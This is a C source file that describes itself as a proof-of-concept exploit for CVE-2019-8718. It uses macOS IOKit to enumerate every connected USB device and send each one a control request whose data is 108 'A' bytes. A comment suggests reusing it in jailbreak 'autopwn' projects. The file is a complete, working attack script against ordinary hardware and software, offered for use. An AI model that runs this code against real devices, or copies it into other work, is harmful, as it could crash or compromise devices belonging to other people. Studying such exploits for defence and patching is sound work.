/* 
	Pure IOKit implementation of CVE-2019-8718 
	Written by Sem Voigtländer.
	Compile: clang iousbusted.c -o iousbusted -framework IOKit -framework CoreFoundation
	Tip: You can also use this for projects like checkm8 autopwn etc.
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <IOKit/usb/IOUSBLib.h>
#include <IOKit/IOCFPlugIn.h>
#include <CoreFoundation/CoreFoundation.h>

/* Faster comparissions for 64-bit integers than != and == */
#define FCOMP(P1,P2) !(P1 ^ P2)

const char *defaultMsg = "HELLO WORLD";

/* Method for sending an USB control message to a target device */
static int send_usb_msg(IOUSBDeviceInterface** dev, int type, int reqno, int val, int idx,  const char *msg)
{
    
    if(!dev){
        printf("No device handle given.\n");
        return KERN_FAILURE;
    }
	
    if(!msg)
        msg = defaultMsg;
    
    IOUSBDevRequest req;
    req.bmRequestType = type;
    req.bRequest = reqno;
    req.wValue = val;
    req.wIndex = idx;
    req.wLength = strlen(msg);
    req.pData =  msg;
    req.wLenDone = 0;
    IOReturn rc = KERN_SUCCESS;
    
    rc = (*dev)->DeviceRequest(dev, &req);
    
    if(rc != KERN_SUCCESS)
    {
        return rc;
    }
    
    return KERN_SUCCESS;
}

static int send_usbusted_pwn_msg(IOUSBDeviceInterface** dev, const char *msg)
{
    
    if(!dev){
        printf("No device handle given.\n");
        return KERN_FAILURE;
    }
    
    kern_return_t rc = send_usb_msg(dev, 0|0x80, 0x6, 0x30c, 0x409, msg);
    
    if(rc != kIOReturnSuccess)
    {
        return rc;
    }

    return KERN_SUCCESS;
}

/* Print information from an IOKit USB device */
static int print_usb_device(io_service_t device){
    
    kern_return_t err = KERN_SUCCESS;
    
    CFNumberRef vid = 0;
    CFNumberRef pid = 0;
    CFNumberRef locationID = 0;
    
    CFMutableDictionaryRef p = NULL;
    err = IORegistryEntryCreateCFProperties(device, &p, NULL, 0);
    
    if(err != KERN_SUCCESS || !p)
        return err;
    
    if(!CFDictionaryGetValueIfPresent(p, CFSTR("idVendor"), &vid))
        return KERN_FAILURE;
    
    if(!CFDictionaryGetValueIfPresent(p, CFSTR("idProduct"), &pid))
        return KERN_FAILURE;
    
    CFDictionaryGetValueIfPresent(p, CFSTR("locationID"), &locationID);
    
    CFNumberGetValue(vid, kCFNumberSInt32Type, &vid);
    CFNumberGetValue(pid, kCFNumberSInt32Type, &pid);	// <-- yes I know this is dirty, I was tired.
    
    if(locationID)
        CFNumberGetValue(locationID, kCFNumberSInt32Type, &locationID);
    
    printf("Got device %#x @ %#x (%#x:%#x)\n", device, locationID, vid, pid);
    return err;
}

/* Get a handle for sending to a device */
static int get_usbdevice_handle(io_service_t device, IOUSBDeviceInterface* dev){

    kern_return_t err = KERN_SUCCESS;
    SInt32 score;
    IOCFPlugInInterface** plugInInterface = NULL;
    
    err = IOCreatePlugInInterfaceForService(device,
                                            kIOUSBDeviceUserClientTypeID,
                                            kIOCFPlugInInterfaceID,
                                            &plugInInterface, &score);
    
    if (err != KERN_SUCCESS || plugInInterface == NULL)
        return err;
    
    err = (*plugInInterface)->QueryInterface(plugInInterface, CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID), (LPVOID*)dev);
    
    if(err != kIOReturnSuccess)
        return err;
    
    // Now done with the plugin interface.
    (*plugInInterface)->Release(plugInInterface);
    //plugInInterface = NULL;
    
    if(!dev)
        return KERN_FAILURE;
    
    return err;
}

/* Iterate over all USB devices */
static int iterate_usb_devices(const char *msg){
    CFMutableDictionaryRef matchingDict;
    io_iterator_t iter;
    kern_return_t kr;
    io_service_t device;

    /* set up a matching dictionary for the class */
    matchingDict = IOServiceMatching(kIOUSBDeviceClassName);
    if (matchingDict == NULL)
    {
        return -1; // fail
    }
    
    /* Now we have a dictionary, get an iterator.*/
    kr = IOServiceGetMatchingServices(kIOMasterPortDefault, matchingDict, &iter);
    if (kr != KERN_SUCCESS)
    {
        return -1;
    }

    /* iterate */
    while ((device = IOIteratorNext(iter)))
    {
        /* do something with device, eg. check properties */
        kr = print_usb_device(device);
        
        if(kr != KERN_SUCCESS){
            printf("Skipping device as it has no vid / pid.\n");
            continue;
        }
        
        IOUSBDeviceInterface **dev = 0;
        kr = get_usbdevice_handle(device, &dev);
        
        if(kr != KERN_SUCCESS){
            printf("Skipping device as no handle for it could be retrieved.\n");
            continue;
        }
        
        kr = send_usbusted_pwn_msg(dev, msg);
        printf("RET: %s\n\n", mach_error_string(kr));
        
        /* And free the reference taken before continuing to the next item */
        IOObjectRelease(device);
    }

   /* Done, release the iterator */
   IOObjectRelease(iter);
   return 0;
}

int main(int argc, char *argv[]){
    char payload[108];
    memset(&payload, 'A', 108);
	int err = iterate_usb_devices(payload);
	return err;
}

